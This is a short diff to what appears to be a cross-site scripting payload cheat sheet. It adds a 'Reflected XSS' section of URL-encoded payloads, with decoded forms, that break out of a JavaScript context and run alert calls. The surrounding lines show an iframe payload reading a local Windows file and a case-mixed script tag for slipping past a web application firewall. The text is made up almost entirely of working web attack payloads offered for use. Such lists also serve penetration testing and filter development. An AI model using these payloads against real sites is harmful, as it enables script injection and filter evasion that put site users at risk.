@@ -137,6 +137,16 @@ You can also read local files:
 <iframe src="file:///C:/Windows/win.ini" width="500" height="500">
 ```
 
+Reflected XSS
+
+`abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e`  --> 
+
+```
+abc`;return+false});});alert`xss`;</script>
+```
+
+`%60%2balert/**/(1)%2b%60`  --> `+alert/**/(1)+` 
+
 WAF Bypass
 
 `<ScRiPt></sCrIpT>`
